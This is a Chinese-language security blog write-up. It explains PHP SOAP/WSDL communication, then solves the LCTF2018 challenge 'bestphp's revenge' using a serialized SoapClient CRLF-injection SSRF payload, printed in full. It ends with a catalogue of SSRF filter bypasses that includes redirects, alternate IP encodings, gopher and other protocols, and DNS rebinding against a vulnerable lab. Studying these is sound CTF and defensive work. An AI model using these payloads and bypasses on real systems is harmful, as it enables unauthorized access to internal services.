    <?php //Server.php保存在服务端// SiteInfo 类用于处理请求Class SiteInfo{    /**     *    返回网站名称     *    @return string      *     */    public function getName(){        return "Hello!<br>";    }    public function getUrl(){        return "www.runoob.com";    }}// 创建 SoapServer 对象$s = new SoapServer(null,array("location"=>"http://localhost/Server.php","uri"=>"Server.php"));// 导出 SiteInfo 类中的全部函数$s->setClass("SiteInfo");// 处理一个SOAP请求，调用必要的功能，并发送回一个响应。$s->handle();?>
    
    
    
    <?php//Client.php保存在客户端try{  // non-wsdl方式调用web service  // 创建 SoapClient 对象  $soap = new SoapClient(null,array('location'=>"http://192.168.0.131/Server.php",'uri'=>'Server.php'));  // 调用函数   $result1 = $soap->getName();  $result2 = $soap->__soapCall("getUrl",array());  echo $result1."<br/>";  echo $result2;} catch(SoapFault $e){  echo $e->getMessage();}catch(Exception $e){  echo $e->getMessage();}
    

访问Client.php，能看到下面的效果

![](https://p2.ssl.qhimg.com/t013ff2006457f5f8bc.png)

查看Wireshark流量得知，no-wsdl下的通信规则相当淳朴:joy:

请求对象的方法

![](https://p1.ssl.qhimg.com/t0163f9c19fb2213a5c.png)

随后返回方法执行后的结果

![](https://p0.ssl.qhimg.com/t0159136bd20a316445.png)

###  WSDL的Soap通信

该环境是Win10+phpstudy下的，目录为soap/

先从网上找到`SoapDiscovery.class.php`这一公共模板文件（当然也可以找我要哈哈），修改一下：

![](https://p3.ssl.qhimg.com/t015f4bfd7689d83e22.png)

写一个提供服务的类或者函数

    
    
    <?php//Service.phpclass Service {    public function HelloWorld () {        return "Hello";    }    public function Add ( $a, $b ) {        return $a + $b;    }}/* 如果要生成wsdl文件注释下面的语句 *///$server = new SoapServer ( 'Service.wsdl', array ( 'soap_version' => SOAP_1_2 ) );//$server->setClass ( "Service" ); //注册Service类的所有方法 //$server->handle (); //处理请求?>
    

写一个文件，用来生成wsdl文件

    
    
    <?php//wsdl.phpinclude("Service.php");include("SoapDiscovery.class.php");$disco = new SoapDiscovery ( 'Service', 'soap' ); //第一个参数是类名（生成的wsdl文件就是以它来命名的），即Service类，第二个参数是服务的名字（这个可以随便写）。$disco->getWSDL ();?>
    

成功的话生成的文件长这个样子

![](https://p3.ssl.qhimg.com/t018717517f8e2fb46f.png)

然后自己写个服务端文件

    
    
    <?php//Service.phpclass Service {    public function HelloWorld () {        return "Hello";    }    public function Add ( $a, $b ) {        return $a + $b;    }}/* 如果要生成wsdl文件注释下面的语句 */$server = new SoapServer ( 'Service.wsdl', array ( 'soap_version' => SOAP_1_2 ) );$server->setClass ( "Service" ); //注册Service类的所有方法 $server->handle (); //处理请求?>
    

客户端文件

    
    
    <?php//Client.phpheader ( "Content-Type: text/html; charset=utf-8" );ini_set ( 'soap.wsdl_cache_enabled', "0" ); //关闭wsdl缓存$client     = new SoapClient ('http://localhost/soap/Service.php?wsdl');$client->__setLocation('http://localhost/soap/Service.php');//print_r($client->__getFunctions());//查询函数//print_r($client->__getTypes());//echo $client->HelloWorld();echo $client->Add ( 28, 2 );//echo $client->__soapCall ( 'Add', array ( 28, 2 ) )//或这样调用//echo $result;?>
    

先访问`http://localhost/soap/service.php`开启服务，然后再访问`http://localhost/soap/client.php`

![](https://p0.ssl.qhimg.com/t01e39ab4ee6f8caff1.png)

抓包看看流程，一共分为四步

![](https://p3.ssl.qhimg.com/t016fc919620ebef20a.png)

**第一步**

访问服务端要求WSDL文档。很明显看URI也知道，找的是wsdl文件（合同必须两个人看才行呀，服务端看了客户端也要看）

![](https://p3.ssl.qhimg.com/t01e43d4c8aa4e8d6c0.png)

**第二步**

服务端把WSDL文档全发回来了；和本地的WSDL对照一下，Van全一致:joy:

![](https://p4.ssl.qhimg.com/t01d8742de317149366.png)

正好，根据这个包来详细讲解一下WSDL吧~

**WSDL总览**

![](https://p1.ssl.qhimg.com/t0192ffe95e9dfe32fd.png)

**\ <message\>元素**

类比函数所需的参数与返回值的类型说明书。接下来开始翻译~

第1-2行，Helloworld函数的所需参数（Request顾名思义，要调用这个函数），这里是无

第3行，Helloworld函数的返回值（Response顾名思义，这个函数的返回值）

第4行，返回的函数名叫Helloworld，返回值类型是xsd:string

第6-9行，Add函数的所需参数;第一个参数为a，类型是xsd:string;第二个参数为b，类型是xsd:string

第10-12行，Add函数的返回值；返回的函数名为Add，返回值类型是xsd:string

    
    
    <message name="HelloWorldRequest"></message><message name="HelloWorldResponse"><part name="HelloWorld" type="xsd:string" /></message><message name="AddRequest"><part name="a" type="xsd:string" /><part name="b" type="xsd:string" /></message><message name="AddResponse"><part name="Add" type="xsd:string" /></message>
    

**\ <porttype\>元素**

类比函数库，标签的`name`字段为”函数库名称”;我们之前类里定义的方法，这里都有体现

    
    
    <portType name="soapPort"><operation name="HelloWorld"><input message="tns:HelloWorldRequest" /><output message="tns:HelloWorldResponse" /></operation><operation name="Add"><input message="tns:AddRequest" /><output message="tns:AddResponse" /></operation></portType>
    

每一个`<operation>`标签都是一个函数：

其中`name`字段为函数名称，`input`字段为函数的参数们，`output`字段为函数的返回值

**\ <bind\>元素**

将函数与Soap绑定，这样才能被Soap协议带出与实现。

例如第3行的`operation`标签开始指示函数与特定SOAP实现的绑定；第4行`soapaction`标识了该函数是隶属于urn:soap的命名空间下，Service类的Helloworld函数

第5-6行`input`和第7-9行`output`分别为函数的参数和返回值两个方向，其中`body`指定SOAP编码样式和与指定服务关联的名称空间URN

    
    
    <binding name="soapBinding" type="tns:soapPort"><soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http" /><operation name="HelloWorld"><soap:operation soapAction="urn:soap#Service#HelloWorld" /><input><soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" /></input><output><soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" /></output></operation><operation name="Add"><soap:operation soapAction="urn:soap#Service#Add" /><input><soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" /></input><output><soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" /></output></operation></binding>
    

**\ <service>元素**

定义Web服务支持的端口。哎呀我来翻译一下算了:joy:

我这个名为`soap`的服务，使用的是名为`soapport`的函数库（\<porttype\>元素定义），该函数库和名为`tns:soapBinding`的Soap服务所绑定（\<bind\>元素定义），你可以从`http://:wsdl.php`访问我这个服务

    
    
    <service name="soap"><documentation /><port name="soapPort" binding="tns:soapBinding"><soap:address location="http://:wsdl.php" /></port></service>
    

现在是不是发现WSDL很简单呢~:laughing:

**第三步**

客户端看了WSDL文档知道该发哪些参数了，于是乎~

把Add函数需要的参数通过Soap协议发给服务器端

![](https://p0.ssl.qhimg.com/t0191e7674a41fd2193.png)

**第四步**

然后服务器端收到参数后处理，再通过Soap协议把函数的返回值发了回来，整个交流结束~

![](https://p5.ssl.qhimg.com/t019423252655245f18.png)

###  攻击

一道很出名的CTF题目，bestphp’s revenge

先补充几个知识点吧~

* * *
    
    
    <?php$target = "http://127.0.0.1/flag.php";$attack = new SoapClient(null,array('location' => $target,    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",    'uri' => "123"));var_dump($attack);//$payload = urlencode(serialize($attack));//echo $payload;?>
    

执行后的结果如下，是一个名为SoapClient的对象实体

    
    
    C:\phpstudy_pro\WWW\hack.php:6:object(SoapClient)[1]  public 'uri' => string '123' (length=3)  public 'location' => string 'http://127.0.0.1/flag.php' (length=25)  public '_user_agent' => string 'N0rth3tyCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4' (length=56)  public '_soap_version' => int 1
    

* * *

SoapClient类的`__call()`方法的奇技淫巧：

    
    
    <?php$a = new SoapClient(null,array('uri'=>'http://192.168.0.136:2333', 'location'=>'http://192.168.0.136:2333/66'));$b = serialize($a);echo $b;$c = unserialize($b);$c->a();//访问一个不存在的方法，触发__call魔法函数?>
    

![](https://p0.ssl.qhimg.com/t012f1c12471420b1d0.png)

这就直接发包了！

* * *

再来看这道题，只有两个文件，index.php和flag.php

    
    
    //index.php<?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name])){    $_SESSION[name] = $_GET[name];}var_dump($_SESSION);$a = array(reset($_SESSION),'welcome_to_the_lctf2018');call_user_func($b,$a);?>
    
    
    
    //flag.phpsession_start();echo 'only localhost can get flag!';$flag = 'LCTF{*************************}';if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){       $_SESSION['flag'] = $flag;   }only localhost can get flag!
    

flag.php说明了获得flag的条件，必须通过127.0.0.1访问才行。这不就是在考SSRF嘛？同时也出现了session_start函数和Session数组可编辑，很明显就是告诉你可以自己设置PHP处理器来反序列化攻击；加上补充的知识点，一下子就出来了思路

> 通过反序列化触发SoapClient类的__call魔术方法，达到127.0.0.1访问flag.php的SSRF攻击效果

利用call_user_func函数，传入GET参数f=session_start和POST数据serialize_handler=php_serialize，这样就执行了

> session_start([‘serialize_handler’=>’php_serialize’])

成功修改了PHP处理器

同时写Payload如下，生成后作为GET参数name的值发出去即可

    
    
    <?php$target = "http://127.0.0.1/flag.php";$attack = new SoapClient(null,array('location' => $target,    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",    'uri' => "123"));$payload = urlencode(serialize($attack));echo $payload;?>
    

别忘了记得加个`|`

>
> |O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D

![](https://p1.ssl.qhimg.com/t0149cb2745c3892401.png)

接下来该思考如何触发SoapClient这个对象实体…有个小细节

`call_user_func()`函数如果传入的参数是`array`类型的话，会将数组的成员当做类名和方法。

这里可以先用`extract()`将b覆盖成`call_user_func()`，`reset($_SESSION)`就是`$_SESSION['name']`（reset的作用就是重置数组指针至开头），我们可以传入`name=SoapClient`，那么最后`call_user_func($b,
$a)`就变成`call_user_func(array('SoapClient','welcome_to_the_lctf2018'))`,即`call_user_func(SoapClient->welcome_to_the_lctf2018)`；`SoapClient`对象实体中没有`welcome_to_the_lctf2018`这个方法，就会调用魔术方法`__call()`从而发包

按下图发包即可

![](https://p0.ssl.qhimg.com/t018560845b82562d5b.png)

最后把回应的Cookie复制，我们用这个Cookie去访问就能拿到Flag啦

![](https://p2.ssl.qhimg.com/t014ae6230c138bdbaa.png)

## 绕过

### **@绕过**

URL的完整格式是

    
    
    [协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]
    

所以你访问

> <a href=”http://baidu.com@1.1.1.1″”>http://baidu.com@1.1.1.1

和

> http://1.1.1.1

效果是一样滴，因为人家解析的本来就是@后面的服务器地址

### **进制绕过**

以PHP为例，一般后端用正则匹配IP长这个样子:

    
    
    $str = '';$isMatched = preg_match_all('/((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}/', $str, $matches);var_dump($isMatched, $matches);
    

所以你可以换成各种进制进行绕过，以`192.168.0.1`为例（这个[网址](http://mo.ab126.com/system/2859.html)可以进行在线转换）

十六进制 = C0A80001

十进制 = 3232235521

二进制 = 11000000101010000000000000000001

### **重定向绕过 &短网址绕过**

一般来说，PHP里的重定向长这样

    
    
    <?phpfunction redirect($url){    header("Location: $url");    exit();}
    

如果`192.168.0.1.xip.io`都被过滤了，但是重定向没有被控制；你可以去[TINYURL](https://tinyurl.com/app/myurls)生成一个短URL

访问短URL的流程就是

`https://tinyurl.com/4czmrv9d`->302跳转->成功访问`192.168.0.1`

这样就成功绕过了检查

### **冷门协议绕过**

如果是php，可以试试php所有的伪协议以及冷门的非HTTP协议

    
    
    php://系列zip:// & bzip2:// & zlib://系列data://phar://file:///dict://sftp://ftp://tftp://ldap://gopher://
    

### **特殊用法绕过**

下面这俩可以试试绕过127.0.0.1:80，不一定有效

    
    
    http://[::]:80/ http://0000::1:80/http://0/
    

中文句号也可以试试

    
    
    192。168。0。1
    

### **xip.io和xip.name**

这俩东西叫泛域名解析，这篇[文章](https://cloud.tencent.com/developer/article/1825757)很详细地描述了泛域名的配置；想要具体了解的可以去看看

一旦配置了这个服务，会出现下面这样的情况

    
    
    10.0.0.1.xip.io         # 解析到 10.0.0.1www.10.0.0.2.xip.io     # www 子域解析到 10.0.0.2mysite.10.0.0.3.xip.io  # mysite 子域解析到 10.0.0.3foo.bar.10.0.0.4.xip.io # foo.bar 子域解析到 10.0.0.4-----------------------------------------------------------------10.0.0.1.xip.name         # 解析到 10.0.0.1www.10.0.0.2.xip.name     # www 子域解析到 10.0.0.2mysite.10.0.0.3.xip.name  # mysite 子域解析到 10.0.0.3foo.bar.10.0.0.4.xip.name # foo.bar 子域解析到 10.0.0.4
    

### **Enclosed alphanumerics字符集绕过**

你能在这个[网站](https://www.mp51.vip/Code/AllUniCode?quwei=2460-24FF)看到这个字符合集，挑选合适的字符就行

    
    
    https://ⓦⓦⓦ.ⓔⓣⓔsⓣⓔ.ⓒⓄⓜ/是完全等同于https://www.eteste.com/
    

当然，适用于域名而不适用与直接IP访问

### **DNS重绑定**

在这里强烈推荐一个外国友人写的[靶场](https://github.com/incredibleindishell/SSRF_Vulnerable_Lab)，基本涵盖了ssrf的所有高级绕过！有兴趣的可以瞅瞅

我们这里就需要用到它的重绑定关卡，其解析也在[这里](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/tree/master/www/DNS%20Rebinding%20based%20Bypass)

**业务理解**

把这一关PHP源码中的重点代码贴出来：

    
    
    <?php/*This code is copied from 33c3ctf CTF*/function get_contents($url) {    $disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];    $url_parts = parse_url($url);        if (!array_key_exists("host", $url_parts)) { die("<p><h3 style=color:red>There was no host in your url!</h3></p>"); }    echo '<table width="40%" cellspacing="0" cellpadding="0" class="tb1" style="opacity: 0.6;">               <tr><td align=center style="padding: 10px;" >Domain: - '.$host = $url_parts["host"].'';        if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {            $ip = $host;        } else {            $ip = dns_get_record($host, DNS_A);            if (count($ip) > 0) {                $ip = $ip[0]["ip"];                echo "<br>Resolved to IP: - {$ip}<br>";                            } else {                die("<br>Your host couldn't be resolved man...</h3></p>");            }        }        foreach ($disallowed_cidrs as $cidr) {            if (in_cidr($cidr, $ip)) {                die("<br>That IP is a blacklisted cidr ({$cidr})!</h3></p>"); // Stop processing if domain reolved to private/reserved IP            }        }        echo "<br>Domain IP is not private, Here goes the data fetched from remote URL<br> </td></tr></table>";        echo "<br><textarea rows=10 cols=50>".file_get_contents($url)."</textarea>";    }.....?>
    

简单叙述一下逻辑：

  1. 判定你给的IP或者域名解析后的IP是否在黑名单中
  2. 若在，退出报错
  3. 若不在，再次访问你给的IP或者域名解析后的IP；执行后续业务模块

所以思路很简单：你只需要有个域名，但是它映射两个IP；同时设置TTL为0，能方便两个IP即刻切换

效果类比：你访问`wwfcww.xyz`这个域名，第一次解析的IP是192.168.0.1；而第二次解析的IP是127.0.0.1

这个操作，就叫做`DNS重绑定`

**需要知道的**

来自[这里](https://blog.csdn.net/u011721501/article/details/54667714)，总结+补充亿点

**TTL是啥？**

TTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。  
当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值

常见的设置TTL值的场景：  
• 增大TTL值，以节约域名解析时间  
• 减小TTL值，减少更新域名记录时的不可访问时间

####  公网DNS服务器的缓存问题

即使我们在前面实现的时候设置了TTL为0（按道理每次都会直接请求NS），但是有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存，完全不按照标准协议来，遇到这种情况是无解的。但是8.8.8.8是严格按照DNS协议去管理缓存的，如果设置TTL为0，则不会进行缓存，从效果上来看，每次dig都会跑去我们的NS服务器上去查询一遍。

**本地DNS缓存**

对于本地的DNS服务器来说，DNS解析有以下几个过程

  1. 查询本地DNS服务器(/etc/systemd/resolved.conf或者/etc/resolv.conf，见后文分析)
  2. 如果缓存未过期，则返回缓存的结果；
  3. 无缓存或缓存过期，则请求远程DNS服务器

所以有时候明明TTL也确实为0，还是需要等待一段时间的问题所在；你可能得关掉本地的DNS缓存

**正常情况**

MAC与Windows系统默认进行DNS缓存；Linux系统默认不进行DNS缓存

同时，IP为8.8.8.8的DNS地址，本地不会进行DNS缓存

  1. Java默认不存在被DNS Rebinding绕过风险（TTL默认为10）
  2. PHP默认会被DNS Rebinding绕过
  3. Linux默认不会进行DNS缓存

但是，这都是“默认”情况；实际上Linux现在自带相当多的DNS缓存方法与工具，也会进行缓存

比如看[这个](https://cloud.tencent.com/developer/article/1830976)来学习一下如何彻底关掉新版Ubuntu的本地DNS功能

**办法**

**使用在线重绑定**

ceye.io自带这个功能，但是效果出奇差

![](https://p2.ssl.qhimg.com/t0139773987d63ad23e.png)

除了这个还有[rebinder](https://lock.cmpxchg8b.com/rebinder.html),效果也一样差-=-
输入你想交替生成的IP，它就会给你个公网域名啦

![](https://p2.ssl.qhimg.com/t019561934a810e30a3.png)

**自建！（需要一定的路由知识）**

因为公网DNS服务器有诸多限制，在线重绑定也很烂…自己动手丰衣足食！

需要以下准备材料：

  * 很Nice的VPS
  * 一个域名，个人推荐去[hostinger](https://hpanel.hostinger.com/)买个

思路很简单：

  * VPS搭建好NS服务器所需要的一切，即把它变成一个DNS服务器
  * 修改你域名的NS服务器，指向你的VPS

如此一来，一旦服务器想要解析你的域名->被指向到你的VPS->VPS自定义解析IP->返回自定义解析的IP

Hostinger按下面这么设置，你的NS服务器改成

> ns1.你的VPS地址.nip.io
>
> ns2.你的VPS地址.nip.io

![](https://p4.ssl.qhimg.com/t015dc5cece6b0611a3.png)

然后部署这个[项目](https://github.com/makuga01/dnsFookup)到你的VPS上；它很多使用细节没写，补充一下：

  * 关掉占用你VPS的53端口的一切服务
  * 该项目自带域名已过期，自己用Grep和Sed把所有自带的域名清除
  * flask运行改为任何IP，即0.0.0.0
  * 任何localhost与127.0.0.1均改为你的VPS地址

还有很多BUG…还是有问题可以私我，我把改好的发你~

随后访问你VPS的项目按说明配置好，然后`dig 生成的域名`，就能看见下面的交互记录啦

![](https://p5.ssl.qhimg.com/t0194b05e0a6793f405.png)

但是用这个项目的过程中，你可能会遇到这种情况：一直dig，它的IP并不会变（项目确实配置好的情况）

![](https://p2.ssl.qhimg.com/t013eddef0333ee89f4.png)

一方面，可能确实是网络堵塞；一方面，你得看看是不是本地DNS服务器搞得鬼：

`dig 生成的域名 @你的VPS`，这样就能强制使用远程NS

![](https://p0.ssl.qhimg.com/t01efb23fd6dadb3620.png)

你看，这样就正常了..说明你需要关掉本地的DNS服务！看一下这个[链接](https://cloud.tencent.com/developer/article/1830976),找到DNS的配置文件

简而言之就是：

> `/etc/resolv.conf` 若指向 `/run/systemd/resolve/stub-resolv.conf`,
> `/usr/lib/systemd/resolv.conf`, `/run/systemd/resolve/resolv.conf`
> 之一，DNS配置文件有效在`/etc/systemd/resolved.conf`
>
> 否则在`/etc/resolv.conf`

![](https://p5.ssl.qhimg.com/t01f3838d77d9939ff5.png)

我的长这个样子，也就是说现在是systemd在管；那么想修改DNS配置得去`/etc/systemd/resolved.conf`

在`DNS`这一栏填上你的VPS

![](https://p3.ssl.qhimg.com/t01bdac7a7b2df6b2fc.png)

执行以下命令

    
    
    systemctl restart systemd-resolved.service #重启DNS服务systemd-resolve --status #查看DNS服务
    

成功！

![](https://p2.ssl.qhimg.com/t01774774919a310abe.png)

然后再修改`/etc/resolv.conf`

![](https://p5.ssl.qhimg.com/t01878e2110cb1c704f.png)

执行如下命令

    
    
    sudo /etc/init.d/networking restart # 重启网卡sudo /etc/init.d/resolvconf restart # 重启DNS（可能没有）
    

![](https://p3.ssl.qhimg.com/t01f618d6a43bbd42f3.png)

成功！

**实操**

这个[靶场](https://github.com/incredibleindishell/SSRF_Vulnerable_Lab)搭好后，来到这个路径`http://192.168.85.138:9000/dns_rebinding.php`；也就是开头咱们说的那一关试验一下

>
> [http://a946635e90c24434850795a27fbb54cb.你的域名/local.txt](http://a946635e90c24434850795a27fbb54cb.%E4%BD%A0%E7%9A%84%E5%9F%9F%E5%90%8D/local.txt)

成功！

![](https://p2.ssl.qhimg.com/t0197a9a0f805d5ac76.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **fi3wey** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/262430](/post/id/262430)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SSRF](/tag/SSRF)

 **+1** __13赞

 __收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg) fi3wey

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

